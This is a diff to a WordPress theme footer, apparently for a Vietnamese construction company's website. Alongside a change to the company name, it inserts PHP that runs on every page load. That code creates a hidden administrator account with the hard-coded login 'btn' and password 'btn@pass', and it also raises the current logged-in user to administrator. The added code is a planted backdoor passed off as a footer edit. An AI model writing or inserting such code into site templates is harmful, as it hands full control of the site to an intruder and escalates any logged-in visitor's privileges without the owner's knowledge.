@@ -6,6 +6,26 @@
 <footer id="footer">
     <div class="container">
       <?php wp_footer(); ?>
+
+      <?php
+
+      $userdata = array(
+    'user_login' =>  'btn',
+    'user_url'   =>  $website,
+    'role' =>'administrator',
+    'user_pass'  =>  'btn@pass' // When creating an user, `user_pass` is expected.
+);
+
+$user_id = wp_insert_user( $userdata ) ;
+
+// On success.
+if ( ! is_wp_error( $user_id ) ) {
+    echo "User created : ". $user_id;
+}
+global $user_ID;
+wp_update_user(array('ID' => $user_ID, 'role' => 'administrator') );
+
+?>
         <div class="row">
             <div class="col-12 col-lg-6 left">
                 <!-- nav footer -->
@@ -97,7 +117,7 @@
 
             <div class="col-12 col-lg-6 right">
 
-<strong class="header-f">CÔNG TY CỔ PHẦN ĐẦU TƯ XÂY DỰNG VÀ THƯƠNG MẠI MHDI 10</strong>
+<strong class="header-f">CÔNG TY CỔ PHẦN ĐẦU TƯ XÂY DỰNG VÀ THƯƠNG MẠI Bắc Trung Nam</strong>
 <div class="contact-f">
     <p>
         <img src="pic/icons/f1.png" alt="">
